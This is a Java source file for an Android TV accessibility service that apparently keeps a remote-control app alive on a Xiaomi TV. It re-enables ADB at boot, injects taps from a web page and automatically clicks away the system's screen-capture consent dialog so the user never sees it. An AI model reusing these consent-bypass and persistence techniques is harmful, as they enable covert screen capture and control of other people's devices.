package com.shijie.adbkeeper;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

/**
 * 这一个无障碍服务同时干三件事：
 *
 *  1) 开机自愈入口：MiTV 的 ROM 拦截了第三方 App 的 BOOT_COMPLETED（v1 实测重启后
 *     BootReceiver 从未被调用，进程根本没起来），但 AccessibilityManagerService 是按
 *     settings 里持久化的 enabled_accessibility_services 列表、由 system_server 在开机后
 *     主动绑定的 —— 这条路厂商拦不到。绑上就把 adb_enabled 写回 1 并拉起守护。
 *
 *  2) 点击注入通道：网页遥控的 tap / swipe / long / 全局按键全靠这里的 dispatchGesture /
 *     performGlobalAction 落地。普通 App 没有 INJECT_EVENTS 权限，无障碍是唯一正规通道。
 *
 *  3) 投屏授权自动确认：Android 9 没有「永久授权」，每次开机第一次要看画面时系统都会弹
 *     「将开始截取… / 立即开始」。这里负责把那个按钮点掉，老板完全无感（见 Consent）。
 */
public class KeeperA11yService extends AccessibilityService {
    private static final String TAG = "AdbKeeper";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "a11y connected -> boot hook + inject channel + consent autoclick");
        Context ctx = getApplicationContext();
        Remote.attach(this);
        KeeperUtil.ensure(ctx);
        KeeperService.kick(ctx);
        KeeperJobService.arm(ctx);
        WebServer.get(ctx).start();
        // 不在这里主动弹投屏授权框 —— 开机就弹会打扰正在看电视的人。
        // 等网页第一次要画面时（/frame.jpg）再走授权流程，那时老板本来就在看手机，
        // 弹框由 Consent 自动点掉，他连看都看不到。
        if (ScreenCapture.hasPermission()) {
            ScreenCapture.get(ctx).start();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 每次界面变化顺手检查（内部有 10 秒节流），多一个触发点，几乎不耗电
        KeeperUtil.ensureThrottled(getApplicationContext());
        // 授权框一出现就点掉
        if (ScreenCapture.awaitingConsent()) {
            CharSequence pkg = event == null ? null : event.getPackageName();
            if (pkg != null && "com.android.systemui".contentEquals(pkg)) {
                Consent.clickIfNeeded(this);
            }
        }
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        Remote.detach();
        Log.i(TAG, "a11y unbound -> inject channel closed");
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        Remote.detach();
        super.onDestroy();
    }

    @Override
    public void onInterrupt() {
    }
}
